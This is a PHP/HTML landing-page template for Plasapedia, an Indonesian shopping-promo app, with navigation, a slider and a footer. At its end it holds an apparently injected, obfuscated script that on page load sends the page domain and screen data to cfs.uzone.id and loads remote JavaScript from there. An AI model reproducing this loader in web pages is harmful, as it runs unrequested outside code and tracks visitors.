<!DOCTYPE html>
<html>
<head>
	<title>Home</title>
	<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
	<link rel="icon" href="<?php echo base_url(); ?>assets/img/icon.png" type="image/png">
	<link href="<?php echo base_url();?>assets/css/bootstrap.min.css" rel="stylesheet">
	<link href="<?php echo base_url();?>assets/styles/style.css" rel="stylesheet">
	<link href="<?php echo base_url();?>assets/css/font-awesome.min.css" rel="stylesheet" type="text/css">
	<link href="<?php echo base_url();?>assets/css/animate.css" rel="stylesheet">
	<link href="https://fonts.googleapis.com/css?family=Open+Sans+Condensed:300,300i,700&amp;subset=cyrillic,cyrillic-ext,greek,greek-ext,latin-ext,vietnamese" rel="stylesheet">
	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
	<link href="https://fonts.googleapis.com/css?family=Exo+2" rel="stylesheet">

</head>
<body onload="hideloader()">
<div id="loading">
</div>
		<nav class="navbar navbar-default navbar-fixed-top flipInX">
			<div class="container">
				<!-- Brand and toggle get grouped for better mobile display -->
				<div class="navbar-header">
					<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
						<span class="sr-only">Toggle navigation</span>
						<span class="icon-bar"></span>
						<span class="icon-bar"></span>
						<span class="icon-bar"></span>
					</button>
					<a class="logo" href="<?php echo base_url('dashboard/'); ?>"><img src="<?php echo base_url();?>assets/img/yogs.gif"></a>
				</div>

				<!-- Collect the nav links, forms, and other content for toggling -->
				<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
					<ul class="nav navbar-nav navbar-right">
						<li class=" wow  fadeInLeft data-wow-duration='0,1s' data-wow-delay='0,1s'"><a style="" href="<?php echo base_url('dashboard/content');?>"><i class="fa fa-question-circle" aria-hidden="true"><strong style="font-family: 'Quicksand', sans-serif;"> Apa itu Plasapedia?</strong></i></a></li>
						<li class=" wow  fadeInRight data-wow-duration='0,1s' data-wow-delay='0,1s'"><a style="" href="<?php echo base_url('dashboard/coverage');?>"><i class="fa fa-map" aria-hidden="true"><strong style="font-family: 'Quicksand', sans-serif"> Coverage Area</strong></i></a></li>
						<li class=" wow  fadeInLeft data-wow-duration='0,1s' data-wow-delay='0,1s'"><a style="" href="<?php echo base_url('dashboard/tenant');?>"><i class="fa fa-compress" aria-hidden="true"><strong style="font-family: 'Quicksand', sans-serif"> Menjadi Tenant</strong></i></a></li>
						<li class=" wow  fadeInRight data-wow-duration='0,1s' data-wow-delay='0,1s'"><a style="" href="<?php echo base_url('dashboard/contact_us');?>"><i class="fa fa-book" aria-hidden="true"><strong style="font-family: 'Quicksand', sans-serif"> Kontak Kami</strong></i></a></li>
					</ul>
				</div>
			</div><!-- /.container-fluid -->
		</nav>
		<br>
		<br>
		<br>
		<div class="container-fluid container-slider">
			<div class="row">
				<div class="wow rollIn data-wow-duration='10,10s' data-wow-delay='90,20s'">
					<div id="carousel-example-generic" class="carousel slide carousel-fade" data-ride="carousel">
						<!-- Indicators -->

						<!-- Wrapper for slides -->
						<div class="slider">
							<div class="carousel-inner" role="listbox">
								<?php 
								if(!empty($data_slider)){
									$i = 0;
									foreach($data_slider as $item) { 
										if($i<=0){
											?>
											<div class="item active" >
												<?php } else { ?>
												<div class="item" >
													<?php } ?>
													<img class="slide" src="<?php echo base_url();?>gambar/<?php echo $item['gambar'] ?>" alt="Gambar 1">
													<div class="carousel-caption animated flip gorengan">
														<p>"Nikmati Cara baru mendapat <br> Info promo Untuk Kamu"<br><a href="<?php echo base_url('dashboard/content'); ?>" target="_blank" style="font-size: 16px; padding: 5px; background:rgba(0,0,0,0.4); color: #fff; border-radius: 30px; ">Read More...</a></p>
													</div>
												</div>
												<?php $i++; }} ?>
											</div>
											<!-- Controls -->
											<a style="border-radius: 10px;" class="left carousel-control" href="#carousel-example-generic" role="button" data-slide="prev">
												<span style="border-radius: 10px;" class="glyphicon glyphicon-chevron-left" aria-hidden="true"></span>
												<span style="border-radius: 10px;" class="sr-only">Previous</span>
											</a>
											<a class="right carousel-control" href="#carousel-example-generic" role="button" data-slide="next">
												<span class="glyphicon glyphicon-chevron-right" aria-hidden="true"></span>
												<span class="sr-only">Next</span>
											</a>
										</div>
									</div>
								</div>
							</div>
						</div>
						<div class="container container-konten">
							<div class="row">
								<br>
								<div class="col-md-4">
									<br>
									<center><p class="isi wow  slideInDown data-wow-duration='0,1s' data-wow-delay='0,1s'"><strong>"Apa itu Plasapedia?"</strong></p>
										<br>
										<p class="wow  lightSpeedIn data-wow-duration='0,1s' data-wow-delay='0,1s'" style="font-size: 20px;">PLASAPEDIA adalah aplikasi promo yang memuatakhirkan metode promosi melalui operator SMS, dilengkapi fitur yang membantu kenyamanan</p>
										<br>
										<a class="" href="https://play.google.com/store/apps/?hl=in"><img class=" bounceInRight" src="<?php echo base_url();?>assets/img/playstur.gif"></a>
										<a class="" href="https://www.google.co.id/url?sa=t&rct=j&q=&esrc=s&source=web&cd=3&cad=rja&uact=8&ved=0ahUKEwiP9OTeuPLPAhWHRY8KHaLWCIsQFgg5MAI&url=https%3A%2F%2Fitunes.apple.com%2Fid%2Fgenre%2Fios%2Fid36%3Fmt%3D8&usg=AFQjCNFm2xhor64Ynr__21IzvKrJ79PhMg&sig2=PQKjeRhO3jLCt_qJ0x4zgA"><img class=" bounceInLeft" src="<?php echo base_url();?>assets/img/iphone.gif"></a></center>
									</div>
									<div class="col-md-4">
										<center><a href="#" target="_blank" ><img class="gambar data-wow-duration='0,1s' data-wow-delay='0,1s'" style="margin-top: 20px;" src="<?php echo base_url();?>assets/img/xyz.png"></a></center>
									</div>
									<div class="col-md-4">
										<br>
										<br>
										<center><img class=" tada" src="<?php echo base_url();?>assets/img/logo.gif">
											<p class="isi1  bounceInRight"><strong>"Kenapa Plasapedia?"</strong></p>
											<br>
											<p style="margin-bottom: 30px; font-size: 20px;" class=" zoomInLeft">Plasapedia menyediakan banyak promo menarik dari puluhan merchant terdaftar di tempat-tempat perbelanjaan kesayangan kamu. Kamu bisa download Aplikasi Plasapedia di Playstore dan Appstore.</p>
										</div></center>
									</div>
								</div>
								<br>
								<br>
								<div class="container-fluid">
									<div class="row">
										<img style="width: 100%; height: 100%;" src="<?php echo base_url();?>assets/img/bg.gif">
									</div>	
								</div>
								<footer><div class="container  slideInDown">
									<center><div class="row">
										<div style="margin-top: 50px;" class="col-md-3 bawah">
											<center style="margin-top: 5px;"><a href="http://magang.novatama.com/cei/index.php/dashboard"><img src="<?php echo base_url();?>assets/img/icon.png" style="margin-top: -10px;"></a><span style=""><strong style="color: #009f95; font-size: 24px; margin-top: 30px;">  PLASA</strong></span><span style="color: #009f95; font-size: 24px;">PEDIA</span></a></center>
										</div>
										<div class="col-md-3 bawah">
											<div style="color:white;">
												<h5><strong style="">KONTAK</h5></strong>
												<div class="">
													<h6>Komplek Ardhini 1, Jalan lilium 2 No. 47, </h6>
													<h6>Jatirahayu, Pondok Melati - </h6>
													<h6>Bekasi 17413</h6>
													<h6>Phone: (021) 84999886</h6>
													<h6 style="color: #fff;">Email:  <a style="color: #fff;" href="email/">info@novatama.co.id</a></h6>
												</div>
											</div>
										</div>
										<div class="col-md-3 bawah">
											<div style="color:white;">
												<h5><strong>MENU</h5></strong>
												<div class="">
													<h6><a style="color: #fff;" href="<?php echo base_url('dashboard/content');?>">Apa itu Plasapedia?</a></a></h6>
													<h6><a style="color: #fff;" href="<?php echo base_url('dashboard/coverage');?>">Coverage Area</a></h6>
													<h6><a style="color: #fff;" href="<?php echo base_url('dashboard/tenant');?>">Menjadi Tenant</a></h6>
													<h6><a style="color: #fff;" href="<?php echo base_url('dashboard/contact_us');?>">Kontak Kami</a></h6>
												</div>
											</div>
										</div>
										<div class="col-md-3 bawah">
											<div style="color:white;">
												<div class="">
													<center><h5 style="color: #fff;"><strong>FIND ME ON</strong></h5></center>
													<center><div class="container-icon" style="display: table-row;">
														<h1 style="display: table-cell;"><a href="https://twitter.com/login?lang=id" target="_blank"><i class="fa fa-twitter" aria-hidden="true" style="padding: 10px; margin-right: 10px; color: #1DA0F2;"></i></a></h2>
															<h1 style="display: table-cell;"><a href="https://www.facebook.com/?stype=lo&jlou=Afc_HpKfE39do7VHKTPAd4H9z2Kt1ZKljO8Yg9xvxzLHJ1Qc8DqZs_trdrwxlHJRLG1J-OCgAjF8Z8UDxTB2ruKDB_AylsFMCHXi3XnkUlH-FQ&smuh=58404&lh=Ac8yLzUB-Dbgl2GO" target="_blank"><i class="fa fa-facebook" aria-hidden="true" style="padding: 10px; margin-right: 10px; color:#33589E; "></i></a></h1>
															<h1 style="display: table-cell;"><a href="https://www.instagram.com/" target="_blank"><i class="fa fa-instagram" aria-hidden="true" style="padding: 10px; margin-right: 10px; color: #6A453C;"></i></a></h1>
															<h1 style="display: table-cell;"><a href="https://plus.google.com/" target="_blank"><i class="fa fa-google-plus" aria-hidden="true" style="padding: 10px; margin-right: 10px; color: #DC4A38;"></i></a></1>
															</div></center>
															<br>
															<center>Powered By &copy <a href="http://novatama.co.id/" target="_blank"><strong style="color: brown;">Novatama Infomedia</strong> </a></center>
														</div>
													</div>
												</div>
											</div>
										</center>
									</footer>
								<script src="<?php echo base_url();?>assets/js/jquery.min.js"></script>
								<script src="<?php echo base_url();?>assets/js/bootstrap.min.js"></script>
								<script src="<?php echo base_url();?>assets/js/wow.min.js"></script>
								<script src="<?php echo base_url();?>assets/js/wow.js"></script>
								<script src="<?=base_url() ?>assets/js/load.js"></script>
								<script>
									$(function(){
										new WOW().init();
									});
								</script>
								<script>
									var myIndex = 0;
									carousel();

									function carousel() {
										var i;
										var x = document.getElementsByClassName("mySlides");
										for (i = 0; i < x.length; i++) {
											x[i].style.display = "none";
										}
										myIndex++;
										if (myIndex > x.length) {myIndex = 1}
											x[myIndex-1].style.display = "block";
										setTimeout(carousel, 9000);
									}
								</script>
								<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "¶ms=" + "4TtHaUQnUEiP6K%2fc5C582H6x5iDAuv2BQu6z0yqEO9dMHdvgZte14lO9lh4cAH%2bj0xLbgxsXJFclSDVQyJhyqRiDox5%2b7ZeuWTPT9r24ufC4y7NWLBsDcy%2f1Xi1kLFGsEZxONSueADUHRj7MXiCuVCT6Ii3hMXBGGk1AnttNWb0lW5Q6BrQjMMizvwRNHElhe%2br8vFvlFiog8EJo99QUf5RalnYRvUxw%2fxknXR7MSihnPfBjCrWHdO1PvaEPG3AQ8XoyTBm9H2H%2fXfe5u898fZEBUQcq5vE%2fMYaLi1x0OTNK4b9z6KhkSK3p34lJyHfs4%2fiZfp7%2bgPNwW5mYJ0PcWjl3hh%2fG3CSX5LB1NY6DGCAqVBc5GvzDuRjbJSXx6%2fnJaS6zBbuMHq2W0y9BElJoDKXTaowjcKasj1PpZ8xSqjtMsqPNhkP7XEIegCpj7ZcR8plNe9%2b6aXZveTH5BYgcEiwMQ1J4Zo%2bLzxnQO0vna%2bfp8c3f%2fZkb2V%2fVfFSAmIGrJ7cMGoqDEhsmAuT8njSXT32Zr6zSBh9MdRmgABYQ9sqGxl%2fm0rMd92KlNP%2fgSjCwbgn1PzGBKRla7M6dyf2%2fhkNhxgMmDAXYSfOQrBljQBU%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};
								</script>
								
							</body>
							</html>